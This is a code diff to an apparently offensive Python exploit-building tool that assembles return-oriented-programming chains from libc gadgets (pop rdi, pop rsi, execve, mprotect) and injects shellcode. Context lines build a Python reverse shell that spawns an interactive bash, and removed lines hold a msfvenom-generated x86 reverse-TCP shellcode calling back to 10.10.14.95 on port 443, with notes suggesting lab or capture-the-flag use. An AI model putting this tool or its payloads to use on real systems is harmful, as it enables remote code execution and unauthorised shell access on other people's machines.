@@ -144,7 +144,7 @@ def stack(shellcode, stack_size, dct_addrs, arch, mode):
         else:
             dct_addrs['code_addr'] = dct_addrs['stack_top_addr']
 
-            required_addrs  = ['code_addr', 'syscall', 'ret_addr', 'execve_addr']
+            required_addrs  = ['code_addr', 'ret_addr', 'execve_addr']
             required_addrs += ['pop_rdi', 'pop_rsi', 'pop_rdx']
             check_addrs(required_addrs, dct_addrs.keys())
 
@@ -196,7 +196,7 @@ def stack(shellcode, stack_size, dct_addrs, arch, mode):
         else:
             dct_addrs['code_addr'] = dct_addrs['stack_top_addr']
 
-            required_addrs  = ['code_addr', 'syscall', 'ret_addr', 'mprotect_addr']
+            required_addrs  = ['code_addr', 'ret_addr', 'mprotect_addr']
             required_addrs += ['pop_rdi', 'pop_rsi', 'pop_rdx']
             check_addrs(required_addrs, dct_addrs.keys())
 
@@ -279,7 +279,6 @@ def main(shellcode, delta_stack, dct_args, libs_args, mode):
         add_addr(shift_to_libc, b'\x61\xc3',     'popa_ret_addr',     'popa; ret')
         add_addr(shift_to_libc, b'\xff\xd6',     'call_esi_addr',     'call esi')
     else:
-        add_addr(shift_to_libc, b'\xf5',         'syscall',           'syscall')
         add_addr(shift_to_libc, b'\x5f\xc3',     'pop_rdi',           'pop rdi; ret')
         add_addr(shift_to_libc, b'\x5e\xc3',     'pop_rsi',           'pop rsi; ret')
         add_addr(shift_to_libc, b'\x5a\xc3',     'pop_rdx',           'pop rdx; ret')
@@ -321,7 +320,7 @@ def main(shellcode, delta_stack, dct_args, libs_args, mode):
 
 
 if __name__ == '__main__':
-    version = '2.1'
+    version = '2.2'
 
     colors = ['','']
     if platform[0:3] == 'lin':
@@ -379,27 +378,12 @@ if __name__ == '__main__':
         args.shellcode += "os.dup2(s.fileno(),0);"
         args.shellcode += "os.dup2(s.fileno(),1);"
         args.shellcode += "os.dup2(s.fileno(),2);"
-        #args.shellcode += "p=subprocess.call(['/bin/bash','-pi'])"
         args.shellcode += "pty.spawn(['/bin/bash','-pi']);"
         args.shellcode  = '/usr/bin/python -c "{}"'.format(args.shellcode)
-        #/usr/bin/sls -b 'X    # enter
-        #/bin/bash -pi'
-        #
-        # udevadm --version    # < 232
-        # 
-        #source /home/decoder/test/echodir/bashrc
 
     if not (args.shellcode or args.fpayload or args.stdin):
-        # host="10.10.14.95"; payload_x86="linux/x86/shell_reverse_tcp"
-        # msfvenom -p $payload_x86 -f python EXITFUNC=thread LHOST=$host LPORT=443
-        buf =  b""
-        buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
-        buf += b"\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a"
-        buf += b"\x0a\x0e\x5f\x68\x02\x00\x20\xfb\x89\xe1\xb0\x66\x50"
-        buf += b"\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73"
-        buf += b"\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0"
-        buf += b"\x0b\xcd\x80"
-        args.shellcode = buf
+        print(usage)
+        sys.exit(0)
     elif args.shellcode:
         args.shellcode = shellcode_convert(args.shellcode)
     elif args.fpayload:
